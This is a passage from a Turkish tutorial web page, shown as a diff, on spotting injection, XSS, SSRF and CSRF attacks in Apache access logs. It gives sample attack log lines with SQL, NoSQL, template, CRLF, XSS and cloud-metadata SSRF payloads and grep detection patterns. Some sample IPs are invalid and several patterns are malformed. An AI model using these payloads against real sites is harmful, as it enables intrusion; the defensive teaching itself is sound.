+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında veya web isteklerinde aşağıdaki işaretlere dikkat etmek gerekir:</p>
+<ul>
+<li><strong>URL veya parametrelerde SQL komutları:</strong><br>
+ <code>UNION SELECT</code>, <code>SELECT</code>, <code>INSERT</code>, <code>DROP TABLE</code>, <code>AND 1=1</code>, <code>' OR '1'='1'</code> gibi ifadeler</li>
+<li><strong>Parametrelerde anormal karakter kullanımı:</strong><br>
+ Tek tırnak <code>'</code>, çift tırnak <code>&quot;</code>, noktalı virgül <code>;</code>, yorum satırı işaretleri <code>--</code> veya <code>#</code></li>
+<li><strong>Anormal uzun URL veya parametre değerleri:</strong><br>
+ Karmaşık ve uzun sorgular</li>
+<li><strong>Sunucu hata kodları:</strong><br>
+ 500 Internal Server Error, 400 Bad Request gibi beklenmedik hatalar artışı</li>
+<li><strong>Tekrarlayan aynı parametre veya sorgu kalıpları:</strong><br>
+ Özellikle farklı varyasyonlarla denemeler yapılması</li>
+</ul>
+<h4 id="apache-erişim-loglarında-sql-enjeksiyon-tespiti">
+  Apache Erişim Loglarında SQL Enjeksiyon Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-sql-enjeksiyon-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>sql enjeksiyon saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.100 - - [01/Jun/2025:10:15:42 +0300] &#34;GET /product?id=1&#39; OR &#39;1&#39;=&#39;1 HTTP/1.1&#34; 200 1234 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.101 - - [01/Jun/2025:10:16:05 +0300] &#34;GET /search?q=UNION+SELECT+username,password+FROM+users HTTP/1.1&#34; 500 532 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.102 - - [01/Jun/2025:10:16:25 +0300] &#34;GET /login.php?username=admin&#39;-- HTTP/1.1&#34; 200 432 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “union|select|drop|insert|delete|’ or ‘| — |;|’” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="nosql-enjeksiyonu-nosql-injection">
+  NoSQL Enjeksiyonu (NoSQL Injection)
+  <a class="heading-link" href="#nosql-enjeksiyonu-nosql-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>NoSQL Enjeksiyonu, geleneksel SQL enjeksiyonuna benzer şekilde, NoSQL veri tabanlarına yönelik yapılan kötü amaçlı sorgu manipülasyonudur. MongoDB, CouchDB gibi NoSQL veri tabanlarında, uygulamanın kullanıcı girdilerini doğru şekilde filtrelememesi durumunda ortaya çıkar.</p>
+<p>Amaç, sorgu yapısını değiştirerek yetkisiz veri erişimi sağlamak, veri sızdırmak veya veri tabanında değişiklik yapmaktır.</p>
+<h4 id="nosql-enjeksiyonu-göstergeleri-indikatörleri">
+  NoSQL Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#nosql-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında aşağıdaki göstergeler tespit edilebilir:</p>
+<ul>
+<li>Parametrelerde JSON yapısı veya operatörleri: <code>{ &quot;$ne&quot;: null }</code>, <code>{ &quot;$gt&quot;: &quot;&quot; }</code>, <code>{ &quot;$regex&quot;: &quot;&quot; }</code> gibi</li>
+<li>Sorgu parametrelerinde anormal veya beklenmedik JSON dizileri</li>
+<li><code>{&quot;$where&quot;: &quot;function() { ... }&quot;}</code> gibi kod enjekte etmeye yönelik yapılar</li>
+<li>URL veya parametrelerde tipik NoSQL operatör ifadeleri (<code>$gt</code>, <code>$lt</code>, <code>$ne</code>, <code>$regex</code>, <code>$or</code>)</li>
+<li>Beklenmedik sayıda veya yapıda parametre kullanımı</li>
+</ul>
+<h4 id="apache-erişim-loglarında-nosql-enjeksiyonu-tespiti">
+  Apache Erişim Loglarında NoSQL Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-nosql-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>NoSQL Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.240 - - [01/Jun/2025:15:00:10 +0300] &#34;GET /search?username[$ne]= HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.241 - - [01/Jun/2025:15:01:20 +0300] &#34;GET /login?password[$gt]= HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.242 - - [01/Jun/2025:15:02:15 +0300] &#34;GET /find?filter={$where: &#39;this.password.length &gt; 0&#39;} HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “$\ne|$gt|$lt|$regex|$or|$where” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="xml-enjeksiyonu-xml-injection">
+  XML Enjeksiyonu (XML Injection)
+  <a class="heading-link" href="#xml-enjeksiyonu-xml-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>XML Enjeksiyonu, web uygulamalarının XML veri işleme aşamasında, kullanıcı girdilerinin yeterince doğrulanmaması sonucu kötü amaçlı XML içeriğinin uygulamaya gönderilmesiyle gerçekleşen bir saldırıdır. Bu saldırı, uygulamanın XML parser’ını kandırarak istenmeyen işlemler yapılmasına yol açabilir.</p>
+<p>Örneğin, XML External Entity (XXE) saldırıları bu kategoriye girer; saldırgan zararlı XML dış kaynaklarını uygulamanın işlemesine sebep olabilir.</p>
+<h4 id="xml-enjeksiyonu-göstergeleri-indikatörleri">
+  XML Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#xml-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gerekenler:</p>
+<ul>
+<li>İstek parametrelerinde veya POST verilerinde &lt;, &gt;, &amp;, &lt;!ENTITY gibi XML özel karakterleri ve yapıları</li>
+<li>XML içeriğinde &lt;!DOCTYPE, SYSTEM, ENTITY ifadeleri</li>
+<li>Normalden uzun veya karmaşık XML verisi gönderimleri</li>
+<li>XML External Entity referansları</li>
+<li>400 Bad Request veya 500 Internal Server Error gibi hata kodları artışı</li>
+</ul>
+<h4 id="apache-erişim-loglarında-xml-enjeksiyonu-tespiti">
+  Apache Erişim Loglarında XML Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-xml-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>XML Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.250 - - [01/Jun/2025:16:10:15 +0300] &#34;POST /api/xmlparser HTTP/1.1&#34; 400 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.251 - - [01/Jun/2025:16:11:20 +0300] &#34;POST /service HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “&lt;!DOCTYPE|SYSTEM|ENTITY” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="ldap-enjeksiyonu-ldap-injection">
+  LDAP Enjeksiyonu (LDAP Injection)
+  <a class="heading-link" href="#ldap-enjeksiyonu-ldap-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>LDAP (Lightweight Directory Access Protocol) enjeksiyonu, bir saldırganın uygulamanın LDAP sorgularına kötü amaçlı girdiler enjekte ederek, yetkisiz erişim sağlaması veya LDAP veritabanı sorgularını manipüle etmesi saldırısıdır.</p>
+<p>Özellikle kullanıcı doğrulama ve yetkilendirme işlemlerinde, LDAP sorgularının kullanıcı girdisiyle doğrudan oluşturulması durumunda ortaya çıkar.</p>
+<h4 id="ldap-enjeksiyonu-göstergeleri-indikatörleri">
+  LDAP Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#ldap-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL veya parametrelerde <code>*</code>, <code>|</code>, <code>&amp;</code>, <code>(</code>, <code>)</code> gibi LDAP özel karakterleri</li>
+<li>Parametrelerde <code>*)(uid=*)</code>, <code>(|(uid=*))</code>, <code>(objectClass=*)</code> gibi sorgu manipülasyonları</li>
+<li>Normal dışı karakterlerle dolu veya karmaşık filtre ifadeleri</li>
+<li>Hatalı veya başarısız giriş denemeleri artışı</li>
+<li>Aynı IP’den çok sayıda deneme</li>
+</ul>
+<h4 id="apache-erişim-loglarında-ldap-enjeksiyonu-tespiti">
+  Apache Erişim Loglarında LDAP Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-ldap-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>LDAP Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.260 - - [01/Jun/2025:17:10:10 +0300] &#34;GET /login?user=*)(uid=*))(|(uid=*)) HTTP/1.1&#34; 401 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.261 - - [01/Jun/2025:17:11:05 +0300] &#34;GET /search?filter=(|(objectClass=*)) HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “\*)||(|&amp;|(|)” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="template-enjeksiyonu-template-injection">
+  Template Enjeksiyonu (Template Injection)
+  <a class="heading-link" href="#template-enjeksiyonu-template-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Template Enjeksiyonu, web uygulamalarında kullanıcıdan alınan verilerin, şablon motorlarında (template engine) yeterince filtrelenmeden işlenmesi sonucu ortaya çıkan bir güvenlik açığıdır.</p>
+<p>Saldırgan, şablon içine kötü niyetli kod enjekte ederek sunucu tarafında kod çalıştırabilir, hassas verilere erişebilir ya da uygulamayı kontrol edebilir.</p>
+<p>Örnek olarak, Jinja2 (Python), Twig (PHP), Freemarker (Java) gibi template motorlarında bu tür zafiyetler görülebilir.</p>
+<h4 id="template-enjeksiyonu-göstergeleri-indikatörleri">
+  Template Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#template-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL veya parametrelerde <code>{{ }}</code>, <code>{% %}</code>, <code>{# #}</code> gibi şablon değişkenleri ve ifadeleri</li>
+<li><code>{{ config }}</code>, <code>{{ self }}</code>, <code>{{ ''.class.mro() }}</code> gibi zararlı kod denemeleri</li>
+<li>Parametrelerde anormal ve şablon motoruna özgü sözdizimi</li>
+<li>Sunucu hata kodlarında artış (500 Internal Server Error gibi)</li>
+<li>Tekrarlayan aynı tip kötü niyetli istekler</li>
+</ul>
+<h4 id="apache-erişim-loglarında-template-enjeksiyonu-tespiti">
+  Apache Erişim Loglarında Template Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-template-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Template Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.270 - - [01/Jun/2025:18:20:10 +0300] &#34;GET /page?template={{config}} HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.271 - - [01/Jun/2025:18:21:30 +0300] &#34;GET /render?tmpl={{self}} HTTP/1.1&#34; 500 512 &#34;-&#34; &#34;curl/7.68.0&#34;  
+192.168.1.272 - - [01/Jun/2025:18:22:45 +0300] &#34;GET /view?content={% if 1==1 %}HELLO{% endif %} HTTP/1.1&#34; 500 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “{{.*}}|{%.+%}|{#.*#}” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="http-başlık-enjeksiyonu-http-header-injection">
+  HTTP Başlık Enjeksiyonu (HTTP Header Injection)
+  <a class="heading-link" href="#http-ba%c5%9fl%c4%b1k-enjeksiyonu-http-header-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>HTTP Header Injection, bir saldırganın web uygulamasına kötü niyetli veriler enjekte ederek HTTP başlıklarını manipüle etmesine olanak veren bir güvenlik açığıdır.</p>
+<p>Bu saldırı, özellikle kullanıcı girdilerinin HTTP başlıklarında (örneğin Set-Cookie, Location gibi) doğru şekilde filtrelenmemesi durumunda ortaya çıkar.</p>
+<p>Saldırgan bu açığı kullanarak HTTP yanıtlarını bölebilir (Response Splitting), Cross-Site Scripting (XSS) saldırısı yapabilir veya oturum çalma gibi zararlar verebilir.</p>
+<h4 id="http-başlık-enjeksiyonu-göstergeleri-indikatörleri">
+  HTTP Başlık Enjeksiyonu Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#http-ba%c5%9fl%c4%b1k-enjeksiyonu-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim kayıtlarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL veya parametrelerde <code>\r</code> (satır başı), <code>\n</code> (satır sonu) karakterlerinin bulunması</li>
+<li>Başlıklarda satır sonu karakteri enjeksiyonu (örneğin <code>%0d</code>, <code>%0a</code>)</li>
+<li>Parametrelerde <code>Set-Cookie:</code>, <code>Location:</code> gibi başlık isimlerinin anormal şekilde kullanılması</li>
+<li>Sunucudan beklenmeyen hata veya anormal yanıt kodlarının artması</li>
+<li>Aynı türden şüpheli isteklerin tekrarlanması</li>
+</ul>
+<h4 id="apache-erişim-kayıtlarında-http-başlık-enjeksiyonu-tespiti">
+  Apache Erişim Kayıtlarında HTTP Başlık Enjeksiyonu Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-kay%c4%b1tlar%c4%b1nda-http-ba%c5%9fl%c4%b1k-enjeksiyonu-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>HTTP Başlık Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.280 - - [01/Jun/2025:19:30:10 +0300] &#34;GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1&#34; 302 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.281 - - [01/Jun/2025:19:31:05 +0300] &#34;GET /page?lang=en%0d%0aContent-Length:%2000 HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “%0d|%0a|\r|\n” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="içerik-enjeksiyonu-content-injection">
+  İçerik Enjeksiyonu (Content Injection)
+  <a class="heading-link" href="#i%c3%a7erik-enjeksiyonu-content-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Content Injection, bir saldırganın web uygulamasına veya web sayfasına kötü niyetli içerik enjekte ederek, ziyaretçilere zararlı veya istenmeyen içerik göstermesini sağlayan bir güvenlik açığıdır.</p>
+<p>Bu saldırı, genellikle kullanıcı girdilerinin doğru şekilde filtrelenmemesi sonucu ortaya çıkar ve HTML, JavaScript, metin ya da diğer içeriklerin içine kötü amaçlı kod eklenmesine yol açar.</p>
+<p>İçerik enjeksiyonu, web sitesinin görünümünü veya işlevselliğini bozabilir, kullanıcıları phishing (oltalama) saldırılarına veya kötü amaçlı yazılım dağıtımına maruz bırakabilir.</p>
+<h4 id="content-injection-göstergeleri-indikatörleri">
+  Content Injection Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#content-injection-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında dikkat edilmesi gereken işaretler:</p>
+<ul>
+<li>URL parametrelerinde veya form verilerinde şüpheli HTML/JavaScript kod parçaları</li>
+<li>Parametrelerde <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>onerror=</code>, <code>javascript:</code> gibi zararlı içerik ifadeleri</li>
+<li>Anormal uzunlukta veya karmaşık kod parçaları içeren istekler</li>
+<li>Sunucudan beklenmedik içerik tipleri veya hata kodları</li>
+<li>Tekrarlayan aynı tip zararlı içerik denemeleri</li>
+</ul>
+<h4 id="apache-erişim-loglarında-content-injection-tespiti">
+  Apache Erişim Loglarında Content Injection Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-content-injection-tespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Content Injection saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.330 - - [01/Jun/2025:22:30:10 +0300] &#34;GET /search?q=&lt;div style=&#39;color:red&#39;&gt;Hacked&lt;/div&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.331 - - [01/Jun/2025:22:31:05 +0300] &#34;POST /comment HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;192.168.1.320 - - [01/Jun/2025:22:00:10 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.321 - - [01/Jun/2025:22:01:05 +0300] &#34;POST /comment HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -E “&lt;html|&lt;div|&lt;span|&lt;table|&lt;script|</script>” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="xss-cross-site-scripting">
+  XSS (Cross-Site Scripting)
+  <a class="heading-link" href="#xss-cross-site-scripting">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>XSS, bir web uygulamasına kötü amaçlı JavaScript veya HTML kodu enjekte edilerek, bu kodun diğer kullanıcıların tarayıcılarında çalıştırılmasıdır. Tüm XSS saldırıları içerik enjeksiyonudur(Content Injection), fakat tüm içerik enjeksiyonları XSS değildir.Amaç, kullanıcı oturumlarını çalmak, zararlı yazılımlar bulaştırmak veya kullanıcıları yanıltmaktır. XSS saldırıları üçe ayrılır:</p>
+<ul>
+<li><strong>Stored (Saklanan) XSS:</strong> Zararlı kod veritabanına veya kalıcı alanlara kaydedilir ve her kullanıcıya gösterilir.</li>
+<li><strong>Reflected (Yansıtılan) XSS:</strong> Zararlı kod, URL veya form aracılığıyla geçici olarak yansıtılır.</li>
+<li><strong>DOM-based XSS:</strong> Zararlı kod, kullanıcı tarafında (tarayıcıda) DOM manipülasyonu yoluyla çalıştırılır.</li>
+</ul>
+<h4 id="xss-saldırısının-göstergeleri-indikatörleri">
+  XSS Saldırısının Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#xss-sald%c4%b1r%c4%b1s%c4%b1n%c4%b1n-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında XSS işaretleri genellikle şunlar olur:</p>
+<ul>
+<li>URL veya parametrelerde <code>&lt;script&gt;</code>, <code>&lt;/script&gt;</code>, <code>alert(</code>, <code>onerror=</code>, <code>javascript:</code> gibi JavaScript veya HTML etiketleri</li>
+<li>Kodlanmış HTML karakterleri: <code>%3C</code> ( &lt; ), <code>%3E</code> ( &gt; ), <code>%22</code> ( &quot; ), <code>%27</code> ( &rsquo; )</li>
+<li>Parametrelerde anormal uzunlukta ve karmaşık karakter dizileri</li>
+</ul>
+<p>Örnek parametreler:<br>
+q=<script>alert(‘XSS’)</script><br>
+search=%3Cimg%20src=x%20onerror=alert(1)%3E</p>
+<h4 id="apache-erişim-loglarında-xsstespiti">
+  Apache Erişim Loglarında XSS Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-xsstespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>xss saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.150 - - [01/Jun/2025:11:20:35 +0300] &#34;GET /search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.151 - - [01/Jun/2025:11:21:12 +0300] &#34;GET /profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1&#34; 200 2048 &#34;-&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “&lt;script|alert|onerror|javascript:” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="ssrf-server-side-requestforgery">
+  <strong>SSRF (Server-Side Request Forgery)</strong>
+  <a class="heading-link" href="#ssrf-server-side-requestforgery">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>SSRF, saldırganın, hedef sunucunun kendisi veya erişebildiği diğer iç sistemlere zararlı istekler göndermesini sağladığı bir güvenlik açığıdır.</p>
+<p>Saldırgan, uygulamanın kullanıcıdan aldığı URL ya da IP adresi gibi girdileri manipüle ederek, sunucunun yetkisiz kaynaklara erişmesine neden olur. Bu sayede iç ağdaki sistemlere sızabilir, hassas verilere ulaşabilir veya sistemde başka saldırılar gerçekleştirebilir.</p>
+<h4 id="ssrf-göstergeleri-indikatörleri">
+  SSRF Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#ssrf-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında gözlemlenebilecek işaretler:</p>
+<ul>
+<li>URL parametrelerinde şüpheli IP adresleri veya localhost adresleri (<code>127.0.0.1</code>, <code>localhost</code>, <code>169.254.x.x</code>, <code>10.x.x.x</code>, <code>192.168.x.x</code>)</li>
+<li>Beklenmedik veya uygulama dışı URL’lere yapılan istekler</li>
+<li>Sunucunun kendi IP adresine ya da özel ağ adreslerine yönelik sık istekler</li>
+<li>Uzun URL parametreleri veya URL içi kodlama (encoding) kullanımı</li>
+<li>Aynı IP’den çok sayıda farklı hedefe yönelik istek denemeleri</li>
+</ul>
+<h4 id="apache-erişim-loglarında-ssrftespiti">
+  Apache Erişim Loglarında SSRF Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-ssrftespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>SSRF saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.300 - - [01/Jun/2025:20:15:10 +0300] &#34;GET /fetch?url=http://127.0.0.1/admin HTTP/1.1&#34; 200 1024 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.301 - - [01/Jun/2025:20:16:05 +0300] &#34;GET /api/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;curl/7.68.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir.</p>
+<blockquote>
+<p>grep -iE “127.0.0.1|localhost|169.254|10.|192.168” /var/log/apache2/access.log</p>
+</blockquote>
+<hr>
+<h3 id="csrf-cross-site-requestforgery">
+  CSRF (Cross-Site Request Forgery)
+  <a class="heading-link" href="#csrf-cross-site-requestforgery">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>CSRF, kullanıcıların yetkili olduğu bir web uygulamasına, kötü niyetli bir sitenin kullanıcı adına istek göndermesini sağlayan saldırı türüdür. Kullanıcı farkında olmadan, yetkilerini kötü amaçlarla kullanan istekler yapılır.</p>
+<p>Örneğin, kullanıcı oturumu açıkken kötü amaçlı bir linke tıkladığında veya bir form gönderdiğinde, saldırganın istediği işlemler gerçekleşebilir.</p>
+<h4 id="csrf-göstergeleri-indikatörleri">
+  CSRF Göstergeleri (İndikatörleri)
+  <a class="heading-link" href="#csrf-g%c3%b6stergeleri-indikat%c3%b6rleri">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Apache erişim loglarında direkt tespiti zor olsa da dolaylı göstergeler şunlar olabilir:</p>
+<ul>
+<li>Beklenmedik POST veya GET istekleri</li>
+<li>Aynı IP veya kullanıcı ajanından farklı oturumlar için anormal sayıda işlem</li>
+<li>Anormal ve tekrar eden belirli endpoint’lere yönelik istekler</li>
+<li>İsteklerde referer (yönlendiren site) başlığının olmaması veya şüpheli olması</li>
+<li>Oturum açmış kullanıcılar için beklenmeyen yetki gerektiren işlemler</li>
+</ul>
+<h4 id="apache-erişim-loglarında-csrftespiti">
+  Apache Erişim Loglarında CSRF Tespiti
+  <a class="heading-link" href="#apache-eri%c5%9fim-loglar%c4%b1nda-csrftespiti">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>CSRF saldırısı içeren örnek apache logu verilmiştir.</p>
+<pre tabindex="0"><code>192.168.1.310 - - [01/Jun/2025:21:10:15 +0300] &#34;POST /account/change-email HTTP/1.1&#34; 200 512 &#34;-&#34; &#34;Mozilla/5.0&#34;  
+192.168.1.310 - - [01/Jun/2025:21:10:17 +0300] &#34;POST /account/change-email HTTP/1.1&#34; 200 512 &#34;http://malicious-site.com&#34; &#34;Mozilla/5.0&#34;
+</code></pre><p>Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir. Apache loglarından doğrudan CSRF saldırısını kesin olarak tespit etmek zor olsa da, Referer kontrolü ve anormal istek davranışları tespiti için log analizi yapılabilir.</p>
+<blockquote>
+<p>grep -E “POST /kritik-endpoint” /var/log/apache2/access.log | grep “Referer: http”</p>
